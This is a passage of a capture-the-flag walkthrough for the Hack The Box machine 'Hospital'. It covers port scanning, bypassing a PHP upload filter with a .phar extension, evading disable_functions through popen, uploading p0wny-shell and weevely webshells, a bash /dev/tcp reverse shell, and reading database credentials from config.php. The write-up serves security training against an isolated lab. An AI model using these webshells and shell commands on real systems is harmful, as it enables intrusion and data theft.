---
title: HTB: Hospital
url: https://0xdf.gitlab.io/2024/04/13/htb-hospital.html
date: 2024-04-13T13:45:00+00:00
difficulty: Medium [30]
os: Windows
tags: ctf, htb-hospital, hackthebox, nmap, windows, ubuntu, netexec, roundcube, upload, feroxbuster, ffuf, burp, burp-repeater, php, webshell, php-disable-functions, dfunc-bypasser, p0wny-shell, weevely, vm, htb-moderators, hashcat, gameoverlay, cve-2023-2640, cve-2023-32629, youtube, cve-2023-35001, shadow, phishing, ghostscript, cve-2023-3664, xampp, htb-rebound, qwinsta, meterpreter, metasploit, msfvenom, espia, meterpreter-screenshot, meterpreter-key-sniff, htb-updown, cpts-like
---

![Hospital](/img/hospital-cover.png)

Hospital is a Windows box with an Ubuntu VM running the company webserver. I’ll bypass upload filters and disable functions to get a PHP webshell in the VM and execution. I’ll escalate using kernel exploits, showing both CVE-2023-35001 and GameOver(lay). As root on the webserver, I’ll crack the password hashes for a user, and get credentials that are also good on the Windows host and the RoundCube webmail. In the mail, I’ll reply to another user who is waiting for a EPS file to exploit a vulnerability in Ghostscript and get execution. To escalate, I’ll show four ways, including the intended path which involves using a keylogger to get the user typing the admin password into RoundCube. In Beyond Root, I’ll look at the automations for the Ghostscript phishing step.

## Box Info

| Name | [Hospital](https://hackthebox.com/machines/hospital)  [Hospital](https://hackthebox.com/machines/hospital) [Play on HackTheBox](https://hackthebox.com/machines/hospital) |
| --- | --- |
| Release Date | [18 Nov 2023](https://twitter.com/hackthebox_eu/status/1725151785625518223) |
| Retire Date | 13 Apr 2024 |
| OS | Windows Windows |
| Base Points | Medium [30] |
| Rated Difficulty | Rated difficulty for Hospital |
| Radar Graph | Radar chart for Hospital |
| First Blood User | 01:08:35[jkr jkr](https://app.hackthebox.com/users/77141) |
| First Blood Root | 01:18:25[m4cz m4cz](https://app.hackthebox.com/users/275298) |
| Creator | [ruycr4ft ruycr4ft](https://app.hackthebox.com/users/1253217) |

## Recon

### nmap

`nmap` finds many open TCP ports:

```

oxdf@hacky$ nmap -p- --min-rate 10000 10.10.11.241
Starting Nmap 7.80 ( https://nmap.org ) at 2024-04-09 01:19 EDT
Nmap scan report for 10.10.11.241
Host is up (0.12s latency).
Not shown: 65510 filtered ports
PORT     STATE SERVICE
22/tcp   open  ssh
53/tcp   open  domain
88/tcp   open  kerberos-sec
135/tcp  open  msrpc
139/tcp  open  netbios-ssn
443/tcp  open  https
445/tcp  open  microsoft-ds
464/tcp  open  kpasswd5
593/tcp  open  http-rpc-epmap
636/tcp  open  ldapssl
1801/tcp open  msmq
2103/tcp open  zephyr-clt
2105/tcp open  eklogin
2107/tcp open  msmq-mgmt
3268/tcp open  globalcatLDAP
3269/tcp open  globalcatLDAPssl
3389/tcp open  ms-wbt-server
5985/tcp open  wsman
6406/tcp open  boe-processsvr
6407/tcp open  boe-resssvr1
6410/tcp open  boe-resssvr4
6617/tcp open  unknown
6644/tcp open  unknown
8080/tcp open  http-proxy
9389/tcp open  adws

Nmap done: 1 IP address (1 host up) scanned in 27.35 seconds
oxdf@hacky$ nmap -p 22,53,88,135,139,443,445,464,593,636,1801,2103,2105,2107,3268,3269,5985,6404,6407,6410,6617,6644,8080,9389 -sCV 10.10.11.241
Starting Nmap 7.80 ( https://nmap.org ) at 2024-04-09 01:20 EDT
Nmap scan report for dc (10.10.11.241)
Host is up (0.34s latency).

PORT     STATE SERVICE           VERSION
22/tcp   open  ssh               OpenSSH 9.0p1 Ubuntu 1ubuntu8.5 (Ubuntu Linux; protocol 2.0)
53/tcp   open  domain?
| fingerprint-strings:
|   DNSVersionBindReqTCP:
|     version
|_    bind
88/tcp   open  kerberos-sec      Microsoft Windows Kerberos (server time: 2024-04-09 05:20:35Z)
135/tcp  open  msrpc             Microsoft Windows RPC
139/tcp  open  netbios-ssn       Microsoft Windows netbios-ssn
443/tcp  open  ssl/http          Apache httpd 2.4.56 ((Win64) OpenSSL/1.1.1t PHP/8.0.28)
|_http-server-header: Apache/2.4.56 (Win64) OpenSSL/1.1.1t PHP/8.0.28
|_http-title: Hospital Webmail :: Welcome to Hospital Webmail
| ssl-cert: Subject: commonName=localhost
| Not valid before: 2009-11-10T23:48:47
|_Not valid after:  2019-11-08T23:48:47
|_ssl-date: TLS randomness does not represent time
| tls-alpn:
|_  http/1.1
445/tcp  open  microsoft-ds?
464/tcp  open  kpasswd5?
593/tcp  open  ncacn_http        Microsoft Windows RPC over HTTP 1.0
636/tcp  open  ldapssl?
| ssl-cert: Subject: commonName=DC
| Subject Alternative Name: DNS:DC, DNS:DC.hospital.htb
| Not valid before: 2023-09-06T10:49:03
|_Not valid after:  2028-09-06T10:49:03
1801/tcp open  msmq?
2103/tcp open  msrpc             Microsoft Windows RPC
2105/tcp open  msrpc             Microsoft Windows RPC
2107/tcp open  msrpc             Microsoft Windows RPC
3268/tcp open  ldap              Microsoft Windows Active Directory LDAP (Domain: hospital.htb0., Site: Default-First-Site-Name)
| ssl-cert: Subject: commonName=DC
| Subject Alternative Name: DNS:DC, DNS:DC.hospital.htb
| Not valid before: 2023-09-06T10:49:03
|_Not valid after:  2028-09-06T10:49:03
3269/tcp open  globalcatLDAPssl?
| ssl-cert: Subject: commonName=DC
| Subject Alternative Name: DNS:DC, DNS:DC.hospital.htb
| Not valid before: 2023-09-06T10:49:03
|_Not valid after:  2028-09-06T10:49:03
5985/tcp open  http              Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
6404/tcp open  msrpc             Microsoft Windows RPC
6407/tcp open  msrpc             Microsoft Windows RPC
6410/tcp open  msrpc             Microsoft Windows RPC
6617/tcp open  msrpc             Microsoft Windows RPC
6644/tcp open  msrpc             Microsoft Windows RPC
8080/tcp open  http              Apache httpd 2.4.55 ((Ubuntu))
| http-cookie-flags:
|   /:
|     PHPSESSID:
|_      httponly flag not set
|_http-open-proxy: Proxy might be redirecting requests
|_http-server-header: Apache/2.4.55 (Ubuntu)
| http-title: Login
|_Requested resource was login.php
9389/tcp open  mc-nmf            .NET Message Framing
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port53-TCP:V=7.80%I=7%D=4/9%Time=6614D036%P=x86_64-pc-linux-gnu%r(DNSVe
SF:rsionBindReqTCP,20,"\0\x1e\0\x06\x81\x04\0\x01\0\0\0\0\0\0\x07version\x
SF:04bind\0\0\x10\0\x03");
Service Info: OSs: Linux, Windows; CPE: cpe:/o:linux:linux_kernel, cpe:/o:microsoft:windows

Host script results:
|_clock-skew: -15s
| smb2-security-mode:
|   2.02:
|_    Message signing enabled and required
| smb2-time:
|   date: 2024-04-09T05:23:00
|_  start_date: N/A

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 193.04 seconds

```

This combination of ports looks like a Windows Domain Controller. Many of the ports show a domain of hospital.htb, and the hostname of DC.hospital.htb is leaked on the TLS certificate on some of the LDAPS ports. There are two potential webservers, HTTPS on 443 and HTTP on 8080.

The Apache server on 8080 shows Ubuntu, which suggests that perhaps this box has a Linux container running on it.

Based on these ports, I’ll prioritize as:
- Tier 1
  - SMB - Check for unauth access to files, or writable shares. Enumerate users. Stuff in my [SMB cheat sheet](/cheatsheets/smb-enum).
  - HTTP / HTTPS - Check website with standard web enumeration.
- Tier 2
  - DNS - Check for Zone transfers, or brute force other subdomains.
  - Kerberos - Brute usernames if unable to with SMB. AS-REP-roast with usernames, Kerberoast with creds.
  - LDAP - Enumerate, though typically need creds (and do in this case).
- Other
  - WinRM - Check for shell once I have creds.
  - SSH - Check for shell once I have creds.
  - RDP - It’s rare to see RDP open on HTB machines. Will check this out with creds.

There are several indicators here that multiple OSes are running. To start, it’s interesting to see WinRM and SSH. The ports clearly are similar to a Windows domain controller (which matches HTB’s label of Windows for this box). Port 8080 has an Apache server string that mentions Ubuntu, while port 443 has an Apache server string that says Windows. Given all of this, it seems likely that this SSH is for the Linux VM / container running on a Windows host.

I’ll run a quick `ffuf` to brute force the HTTP and HTTPS ports for any subdomains of hospital.htb that returns a different site, but not find anything. I’ll update my `/etc/hosts` file:

```
10.10.11.241 dc dc.hospital.htb hospital.htb

```

### SMB - TCP 445

There doesn’t seem to be any unauthenticated access over SMB:

```

oxdf@hacky$ netexec smb 10.10.11.241 -u oxdf -p '' --shares
SMB         10.10.11.241    445    DC               [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC) (domain:hospital.htb) (signing:True) (SMBv1:False)
SMB         10.10.11.241    445    DC               [-] hospital.htb\oxdf: STATUS_LOGON_FAILURE 
oxdf@hacky$ netexec smb 10.10.11.241 -u guest -p '' --shares
SMB         10.10.11.241    445    DC               [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC) (domain:hospital.htb) (signing:True) (SMBv1:False)
SMB         10.10.11.241    445    DC               [-] hospital.htb\guest: STATUS_ACCOUNT_DISABLED 
oxdf@hacky$ smbclient -N -L //10.10.11.241
session setup failed: NT_STATUS_ACCESS_DENIED

```

### RoundCube - TCP 443

#### Site

The service on HTTPS is an instance of RoundCube, a webmail service:

![image-20240408182930796](/img/image-20240408182930796.png)

Under the login page it says “Hospital Webmail”.

#### Tech Stack

RoundCube is an open-source PHP-base webmail service available on [GitHub](https://github.com/roundcube/roundcubemail). From the login page, it’s possible to get the version by looking at the page source:

![image-20240408183241011](/img/image-20240408183241011.png)

10604 maps to 1.6.4, as can been seen in `rc_mail_output_html.php` [here](https://github.com/search?q=repo%3Aroundcube%2Froundcubemail%20rcversion&type=code):

![image-20240408183338422](/img/image-20240408183338422.png)

According to the [releases page](https://github.com/roundcube/roundcubemail/releases), this version was release on Oct 16 2023. 1.6.5 released on Nov 5, and Hospital released on HTB on Nov 18. There’s no obvious vulnerabilities in 1.6.5 worth exploiting, and this suggests that 1.6.4 was the latest version while Hospital was under development. As Hospital retires, the latest version is 1.6.6. Nothing jumps out as potentially exploitable in 1.6.4.

### Website - TCP 8080

#### Site

This page also presents a login page:

![image-20240408183733466](/img/image-20240408183733466.png)

Unlike RoundCube, there’s no obvious public software, but rather the site seems custom to Hospital. There’s also a link to make an account.

When I make an account and log in, there’s a form to upload medical records:

![image-20240408183857441](/img/image-20240408183857441.png)

A peak at the HTML `input` shows that it accepts images:

![image-20240408211603001](/img/image-20240408211603001.png)

If I give it an image and hit Upload, it lands the browser on `/success.php`:

![image-20240408211758825](/img/image-20240408211758825.png)

#### Directory Brute Force

I’ll run `feroxbuster` against the site, and include `-x php` since I know the site is PHP:

```

oxdf@hacky$ feroxbuster -u http://10.10.11.241:8080 -x php

 ___  ___  __   __     __      __         __   ___
|__  |__  |__) |__) | /  `    /  \ \_/ | |  \ |__
|    |___ |  \ |  \ | \__,    \__/ / \ | |__/ |___
by Ben "epi" Risher 🤓                 ver: 2.9.3
───────────────────────────┬──────────────────────
 🎯  Target Url            │ http://10.10.11.241:8080
 🚀  Threads               │ 50
 📖  Wordlist              │ /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt
 👌  Status Codes          │ All Status Codes!
 💥  Timeout (secs)        │ 7
 🦡  User-Agent            │ feroxbuster/2.9.3
 💉  Config File           │ /etc/feroxbuster/ferox-config.toml
 💲  Extensions            │ [php]
 🏁  HTTP methods          │ [GET]
 🔃  Recursion Depth       │ 4
 🎉  New Version Available │ https://github.com/epi052/feroxbuster/releases/latest
───────────────────────────┴──────────────────────
 🏁  Press [ENTER] to use the Scan Management Menu™
──────────────────────────────────────────────────
403      GET        9l       28w      279c Auto-filtering found 404-like response and created new filter; toggle off with --dont-filter
404      GET        9l       31w      276c Auto-filtering found 404-like response and created new filter; toggle off with --dont-filter
302      GET        0l        0w        0c http://10.10.11.241:8080/ => login.php
301      GET        9l       28w      316c http://10.10.11.241:8080/js => http://10.10.11.241:8080/js/
301      GET        9l       28w      317c http://10.10.11.241:8080/css => http://10.10.11.241:8080/css/
301      GET        9l       28w      320c http://10.10.11.241:8080/images => http://10.10.11.241:8080/images/
302      GET        0l        0w        0c http://10.10.11.241:8080/logout.php => login.php
200      GET      113l      341w     5125c http://10.10.11.241:8080/register.php
200      GET      133l      439w     5739c http://10.10.11.241:8080/login.php
301      GET        9l       28w      321c http://10.10.11.241:8080/uploads => http://10.10.11.241:8080/uploads/
200      GET        0l        0w        0c http://10.10.11.241:8080/upload.php
200      GET        0l        0w        0c http://10.10.11.241:8080/config.php
302      GET        0l        0w        0c http://10.10.11.241:8080/index.php => login.php
301      GET        9l       28w      319c http://10.10.11.241:8080/fonts => http://10.10.11.241:8080/fonts/
301      GET        9l       28w      326c http://10.10.11.241:8080/images/icons => http://10.10.11.241:8080/images/icons/
301      GET        9l       28w      320c http://10.10.11.241:8080/vendor => http://10.10.11.241:8080/vendor/
200      GET       83l      208w     3536c http://10.10.11.241:8080/success.php
301      GET        9l       28w      327c http://10.10.11.241:8080/vendor/jquery => http://10.10.11.241:8080/vendor/jquery/
301      GET        9l       28w      328c http://10.10.11.241:8080/vendor/animate => http://10.10.11.241:8080/vendor/animate/
[####################] - 8m    300000/300000  0s      found:17      errors:13045
[####################] - 6m     30000/30000   75/s    http://10.10.11.241:8080/
[####################] - 6m     30000/30000   73/s    http://10.10.11.241:8080/js/
[####################] - 6m     30000/30000   78/s    http://10.10.11.241:8080/css/
[####################] - 6m     30000/30000   76/s    http://10.10.11.241:8080/images/
[####################] - 6m     30000/30000   71/s    http://10.10.11.241:8080/uploads/
[####################] - 6m     30000/30000   72/s    http://10.10.11.241:8080/fonts/
[####################] - 6m     30000/30000   73/s    http://10.10.11.241:8080/images/icons/
[####################] - 6m     30000/30000   73/s    http://10.10.11.241:8080/vendor/
[####################] - 6m     30000/30000   77/s    http://10.10.11.241:8080/vendor/jquery/
[####################] - 3m     30000/30000   147/s   http://10.10.11.241:8080/vendor/animate/

```

The `/uploads` directory is interesting, and the uploaded image is in this directory as well without a filename change:

![image-20240408213846232](/img/image-20240408213846232.png)

This directory is cleaned out every minute or two.

## Shell as www-data on webserver

### Execution POC

#### Test Magic Bytes

I’ll start by sending the successful image upload to Burp repeater. The first thing I want to look for is if it is checking the magic bytes of the file. I’ll delete the entire image, and replace it with text:

![image-20240408214148420](/img/image-20240408214148420.png)

It returns success. I can try a simple PHP script (it’s always good to start with a simple script before going for a webshell) instead and it still uploads, and I can fetch it from the uploads directory:

```

oxdf@hacky$ curl http://10.10.11.241:8080/uploads/lego.png
<?php echo "RCE!"; ?>

```

The problem here is that the server is not treating it as PHP, but rather as a raw file (like an image).

#### Extension

I need to change the saved file name such that Apache recognizes it and sends it to PHP for processing. I can try a double extension (like `lego.php.png`), but that still returns the raw PHP (it’s not executed).

The HackTricks page on [File Upload](https://book.hacktricks.xyz/pentesting-web/file-upload) has a list of other extensions that are commonly handled and executed as PHP:

> *.php*, *.php2*, *.php3*, .*php4*, .*php5*, .*php6*, .*php7*, .phps, .*phps*, .*pht*, .*phtm, .phtml*, .*pgif*, *.shtml, .htaccess, .phar, .inc, .hphp, .ctp, .module*

I’ll create a wordlist that contains these extensions, and generate a `ffuf` command to fuzz for any that allow upload:
- `-H 'Content-Type: multipart/form-data; boundary=---------------------------11902181737497576573931872037'` - This header tells the server that there is form data divided by this marker.
- `-d [form data]` - This is the form data being submitted. In here, I’ll include `filename=\"lego.FUZZ\"` to show `ffuf` the place to use the wordlist.
- `-u 'http://10.10.11.241:8080/upload.php'` - The URL to POST to.
- `-mr "Location: /success.php"` - Only show responses that contain this header.

```

oxdf@hacky$ ffuf -H 'Content-Type: multipart/form-data; boundary=---------------------------11902181737497576573931872037' -d $'-----------------------------11902181737497576573931872037\x0d\x0aContent-Disposition: form-data; name=\"image\"; filename=\"lego.FUZZ\"\x0d\x0aContent-Type: application/x-php\x0d\x0a\x0d\x0a<?php echo "RCE!"; ?>\x0d\x0a-----------------------------11902181737497576573931872037--\x0d\x0a' -u 'http://10.10.11.241:8080/upload.php' -w php-exts -mr "Location: /success.php"

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v2.0.0-dev
________________________________________________

 :: Method           : POST
 :: URL              : http://10.10.11.241:8080/upload.php
 :: Wordlist         : FUZZ: /home/oxdf/hackthebox/hospital-10.10.11.241/php-exts
 :: Header           : Content-Type: multipart/form-data; boundary=---------------------------11902181737497576573931872037
 :: Data             : -----------------------------11902181737497576573931872037
Content-Disposition: form-data; name="image"; filename="lego.FUZZ"
Content-Type: application/x-php

<?php echo "RCE!"; ?>
-----------------------------11902181737497576573931872037--

 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Regexp: Location: /success.php
________________________________________________

phps                    [Status: 302, Size: 0, Words: 1, Lines: 1, Duration: 111ms]
pht                     [Status: 302, Size: 0, Words: 1, Lines: 1, Duration: 111ms]
phar                    [Status: 302, Size: 0, Words: 1, Lines: 1, Duration: 111ms]
module                  [Status: 302, Size: 0, Words: 1, Lines: 1, Duration: 111ms]
hphp                    [Status: 302, Size: 0, Words: 1, Lines: 1, Duration: 115ms]
pgif                    [Status: 302, Size: 0, Words: 1, Lines: 1, Duration: 116ms]
shtml                   [Status: 302, Size: 0, Words: 1, Lines: 1, Duration: 117ms]
phtm                    [Status: 302, Size: 0, Words: 1, Lines: 1, Duration: 117ms]
ctp                     [Status: 302, Size: 0, Words: 1, Lines: 1, Duration: 2652ms]
inc                     [Status: 302, Size: 0, Words: 1, Lines: 1, Duration: 3655ms]
htaccess                [Status: 302, Size: 0, Words: 1, Lines: 1, Duration: 4656ms]
:: Progress: [19/19] :: Job [1/1] :: 3 req/sec :: Duration: [0:00:05] :: Errors: 0 ::

```

A few of these extensions allow for uploads. Each of these would have already uploaded the file, so I’ll turn these extensions into a wordlist, and fuzz again. This time much simpler. The uploaded PHP is 21 characters long. If it executes, it will output only four characters, “RCE!”.

```

oxdf@hacky$ ffuf -u http://10.10.11.241:8080/uploads/FUZZ -w uploaded 

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v2.0.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://10.10.11.241:8080/uploads/FUZZ
 :: Wordlist         : FUZZ: /home/oxdf/hackthebox/hospital-10.10.11.241/uploaded
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200,204,301,302,307,401,403,405,500
________________________________________________

lego.pgif               [Status: 200, Size: 21, Words: 4, Lines: 1, Duration: 114ms]
lego.phps               [Status: 403, Size: 279, Words: 20, Lines: 10, Duration: 114ms]
lego.shtml              [Status: 200, Size: 21, Words: 4, Lines: 1, Duration: 114ms]
lego.ctp                [Status: 200, Size: 21, Words: 4, Lines: 1, Duration: 114ms]
lego.phar               [Status: 200, Size: 4, Words: 1, Lines: 1, Duration: 114ms]
lego.hphp               [Status: 200, Size: 21, Words: 4, Lines: 1, Duration: 114ms]
lego.htaccess           [Status: 200, Size: 21, Words: 4, Lines: 1, Duration: 114ms]
lego.module             [Status: 200, Size: 21, Words: 4, Lines: 1, Duration: 114ms]
lego.inc                [Status: 200, Size: 21, Words: 4, Lines: 1, Duration: 589ms]
:: Progress: [11/11] :: Job [1/1] :: 0 req/sec :: Duration: [0:00:00] :: Errors: 0 ::

```

Any of the responses that are 21 in size are returning the unexecuted PHP code. The `.phps` file seems to generate a 403 forbidden. And the `.phar` seems to be executing. I’ll confirm that manually:

![image-20240409130647227](/img/image-20240409130647227.png)

### Disable Functions

#### Webshell Fail

The obvious next step (or first step if I wasn’t wise enough to start with an `echo`) would be to upgrade this PHP to a webshell:

![image-20240409134151744](/img/image-20240409134151744.png)

The upload works, but when triggering it doesn’t result in execution:

![image-20240409134208909](/img/image-20240409134208909.png)

The response is just empty.

#### Identify Disable Functions

The `phpinfo` function is a debug function in PHP that will show all sorts of information about the server and it’s configuration. I’ll update my script to:

```

<?php phpinfo(); ?>

```

Now it has all this information:

![image-20240409134405757](/img/image-20240409134405757.png)

`disable_functions` is a configuration that blocks certain PHP functions from being executed:

![image-20240409134530834](/img/image-20240409134530834.png)

The configuration on Hospital includes `system` (which I was trying in my webshell) as well as many of the other ways to run system commands through PHP.

### Full RCE

I’ll show a three ways to bypass the disabled functions for this case.

```

flowchart TD;
    A[PHP Execution]-->B(<a href='#popen'>popen</a>);
    B-->C(Execution as www-data);
    A-->D;
    D[<a href='#p0wny-shell
'>p0wny-shell</a>]-->B;
    E[<a href='#weevely'>weevely</a>]-->C;
    A-->E;
    subgraph identifier[" "]
      direction LR
      start1[ ] --->|intended| stop1[ ]
      style start1 height:0px;
      style stop1 height:0px;
      start2[ ] --->|unintended| stop2[ ]
      style start2 height:0px;
      style stop2 height:0px;
    end

linkStyle default stroke-width:2px,stroke:#FFFF99,fill:none;
linkStyle 0,1,2,3,7 stroke-width:2px,stroke:#4B9CD3,fill:none;
style identifier fill:#1d1d1d,color:#FFFFFFFF;

```

#### popen

The simplest is to recognize that the author forgot to block one of the PHP functions that will give execution - `popen`. This was the [intended exploitation on Moderators](/2022/11/05/htb-moderators.html#popen), and there was a similar path on [UpDown](/2023/01/21/htb-updown.html#disable_functions). In UpDown I showed [dfunc-bypasser](https://github.com/teambi0s/dfunc-bypasser), which is a Python script you point at `phpinfo()` output and it flags available dangerous functions. I don’t love this tools, as it’s legacy python, and it makes more sense to do this in PHP. IppSec [made a quick PHP script](https://www.youtube.com/watch?v=yW_lxWB1Yd0&t=1620s) to do this, and I’ll borrow from that (with slight modifications):

```

<?php

$dangerous_functions = array('pcntl_alarm','pcntl_fork','pcntl_waitpid','pcntl_wait','pcntl_wifexited','pcntl_wifstopped','pcntl_wifsignaled','pcntl_wifcontinued','pcntl_wexitstatus','pcntl_wtermsig','pcntl_wstopsig','pcntl_signal','pcntl_signal_get_handler','pcntl_signal_dispatch','pcntl_get_last_error','pcntl_strerror','pcntl_sigprocmask','pcntl_sigwaitinfo','pcntl_sigtimedwait','pcntl_exec','pcntl_getpriority','pcntl_setpriority','pcntl_async_signals','error_log','system','exec','shell_exec','popen','proc_open','passthru','link','symlink','syslog','ld','mail');

foreach ($dangerous_functions as $f) {
  if (function_exists($f)) {
    echo $f . " is enabled<br/>\n";
  }
}

?>

```

It loops over the dangerous functions, and if they exists, prints it to the screen. I’ll upload that as `0xdf.phar`, and load the page:

![image-20240410114022694](/img/image-20240410114022694.png)

Knowing that `popen` works, I’ll work with that. The [PHP docs](https://www.php.net/manual/en/function.popen.php) for `popen` show that it opens a file pointer to the process. I’ll use the same payload I used on Moderators:

```

<?php echo fread(popen($_REQUEST['cmd'], "r"), 1000000); ?>

```

Once uploading, it works:

![image-20240409140325675](/img/image-20240409140325675.png)

#### p0wny-shell

A nicer PHP webshell that is very common now is [p0wny-shell](https://github.com/flozz/p0wny-shell). I’ll copy the contents of `shell.php`, and upload it through Burp Repeater:

![image-20240409140956272](/img/image-20240409140956272.png)

Now on visiting `/uploads/p0wny.phar`, I get a slick interactive shell in the browser:

![image-20240409141112783](/img/image-20240409141112783.png)

Under the hood, this shell has an `executeCommand` function that starts on [Line 25](https://github.com/flozz/p0wny-shell/blob/master/shell.php#L25-L54):

```

function executeCommand($cmd) {
    $output = '';
    if (function_exists('exec')) {
...[snip]...
    } else if (function_exists('shell_exec')) {
...[snip]...
    } else if (allFunctionExist(array('system', 'ob_start', 'ob_get_contents', 'ob_end_clean'))) {
...[snip]...
    } else if (allFunctionExist(array('passthru', 'ob_start', 'ob_get_contents', 'ob_end_clean'))) {
...[snip]...
    } else if (allFunctionExist(array('popen', 'feof', 'fread', 'pclose'))) {
...[snip]...
    } else if (allFunctionExist(array('proc_open', 'stream_get_contents', 'proc_close'))) {
...[snip]...
    }
    return $output;
}

```

It basically checks for each way of getting execution, and when it finds one, runs it. So this works here, but only because `popen` is not blocked.

#### weevely

[weevely](https://github.com/epinna/weevely3) is almost a full post exploitation framework rather than just a webshell. It works by using a Python script to generate a PHP file to upload. Then the same Python script takes the URL to the uploaded file and manages interacting providing a shell with a ton of plugins.

I’ll generate an agent giving it an output filename and a password:

```

oxdf@hacky$ /opt/weevely3/weevely.py generate 0xdf 0xdf.phar
Generated '0xdf.phar' with password '0xdf' of 692 byte size.

```

The output is a jumbled mix of PHP code and binary data that the Python script can interact with:

```

<?php include "\160\x68\141\x72\72\57\57".basename(__FILE__)."\57\x78";__HALT_COMPILER(); ?>/xZNUk0Wpфa}
{{C\iZ5)ircB
            {AZ-raDp>MA i6r.7Yğ?_ޞl}A~4kk߃= E]
                                              Eɡ)
:
Z
 9%M-!  i'hEQtm__^~5GgByH"9^n)`Aڏ^R%+kJ26փbKMRyx3\P4>xj:N2%m(V5kmۚ(dd,UjN(o&**l;.?E.:<ÈP+OhGBMB

```

I’ll upload it to Hospital using the form, and the connect with `weevely`:

```

oxdf@hacky$ /opt/weevely3/weevely.py http://10.10.11.241:8080/uploads/0xdf.phar 0xdf

[+] weevely 4.0.1

[+] Target:     www-data@webserver:/var/www/html/uploads
[+] Session:    /home/oxdf/.weevely/sessions/10.10.11.241/0xdf_0.session
[+] Shell:      System shell

[+] Browse the filesystem or execute commands starts the connection
[+] to the target. Type :help for more information.

weevely> id
uid=33(www-data) gid=33(www-data) groups=33(www-data)

```

### Shell

Regardless of which method I use to get RCE, I’ll get a reverse shell using a [bash reverse shell](https://www.youtube.com/watch?v=OjkVep2EIlw):

```

weevely> bash -c 'bash -i >& /dev/tcp/10.10.14.6/443 0>&1'

```

At `nc`:

```

oxdf@hacky$ nc -lnvp 443
Listening on 0.0.0.0 443                      
Connection received on 10.10.11.241 6582         
bash: cannot set terminal process group (910): Inappropriate ioctl for device
bash: no job control in this shell
www-data@webserver:/tmp$ 

```

I’ll upgrade the shell using the [standard trick](https://www.youtube.com/watch?v=DqE6DxqJg8Q):

```

www-data@webserver:/tmp$ script /dev/null -c bash
script /dev/null -c bash
Script started, output log file is '/dev/null'.
www-data@webserver:/tmp$ ^Z
[1]+  Stopped                 nc -lnvp 443
oxdf@hacky$ stty raw -echo ; fg
nc -lnvp 443
            reset
reset: unknown terminal type unknown
Terminal type? screen
www-data@webserver:/tmp$  

```

## Shell as root on webserver

### Enumeration

#### VM

Clearly this is not a Windows OS. The webserver is running on Ubuntu 23.04:

```

www-data@webserver:/$ cat /etc/lsb-release 
DISTRIB_ID=Ubuntu
DISTRIB_RELEASE=23.04
DISTRIB_CODENAME=lunar
DISTRIB_DESCRIPTION="Ubuntu 23.04"

```

This is consistent with the results of my [initial scanning](#nmap). It’s likely either a Docker container or a virtual machine running on the Windows OS. There are no indications this is a Docker container, so I’ll lean VM.

#### Home Directories

There is one user in this VM, drwilliams:

```

www-data@webserver:/var/www/html$ cat /etc/passwd | grep "sh$" 
root:x:0:0:root:/root:/bin/bash
drwilliams:x:1000:1000:Lucy Williams:/home/drwilliams:/bin/bash
www-data@webserver:/var/www/html$ ls /home/
drwilliams

```

www-data can’t access their directory.

#### Web

There isn’t much of interest on the box besides web activity. The process list shows Apache workers and not much else. I’ll look at the website. Apache is configured to serv from `/var/www/html`:

```

<VirtualHost *:80>

        ServerAdmin webmaster@localhost
        DocumentRoot /var/www/html
        DirectoryIndex index.php

        ErrorLog ${APACHE_LOG_DIR}/error.log
        CustomLog ${APACHE_LOG_DIR}/access.log combined

</VirtualHost>

```

`/etc/apache2/mods-enabled/php7.4.conf` shows what files are processed as PHP:

```

<FilesMatch ".+\.ph(ar|p|tml)$">
    SetHandler application/x-httpd-php
</FilesMatch>
<FilesMatch ".+\.phps$">
    SetHandler application/x-httpd-php-source
    Require all denied
</FilesMatch>
<FilesMatch "^\.ph(ar|p|ps|tml)$">
    Require all denied
</FilesMatch>

<IfModule mod_userdir.c>
    <Directory /home/*/public_html>
        php_admin_flag engine Off
    </Directory>
</IfModule>

```

The `/var/www/html` directory has the web application:

```

www-data@webserver:/var/www/html$ ls
config.php  fonts      js          register.php  uploads
css         images     login.php   success.php   vendor
failed.php  index.php  logout.php  upload.php

```

`config.php` handles the database connection:

```

/* Database credentials. Assuming you are running MySQL
server with default setting (user 'root' with no password) */
define('DB_SERVER', 'localhost');
define('DB_USERNAME', 'root');
define('DB_PASSWORD', 'my$qls3rv1c3!');
define('DB_NAME', 'hospital');
 
/* Attempt to connect to MySQL database */
$link = mysqli_connect(DB_SERVER, DB_USERNAME, DB_PASSWORD, DB_NAME);
 
// Check connection
if($link === false){
    die("ERROR: Could not connect. " . mysqli_connect_error());
}
?>

```

I’ll note those creds.

#### DB

`mysql` is in the VM and with the creds I’ll explore the database. There’s only one interesting table:

```

www-data@webserver:/var/www/html$ mysql -u root -p'my$qls3rv1c3!'    
Welcome to the MariaDB monitor.  Commands end with ; or \g.
Your MariaDB connection id is 26
Server version: 10.11.2-MariaDB-1 Ubuntu 23.04

Copyright (c) 2000, 2018, Oracle, MariaDB Corporation Ab and others.

Type 'help;' or '\h' for help. Type '\c' to clear the current input statement.

MariaDB [(none)]> show databases;
+--------------------+
| Database           |
+--------------------+
| hospital           |
| information_schema |
| mysql              |
| performance_schema |
| sys                |
+--------------------+
5 rows in set (0.004 sec)

```

It has only one table:

```

MariaDB [(none)]> use hospital;
Reading table information for completion of table and column names
You can turn off this feature to get a quicker startup with -A

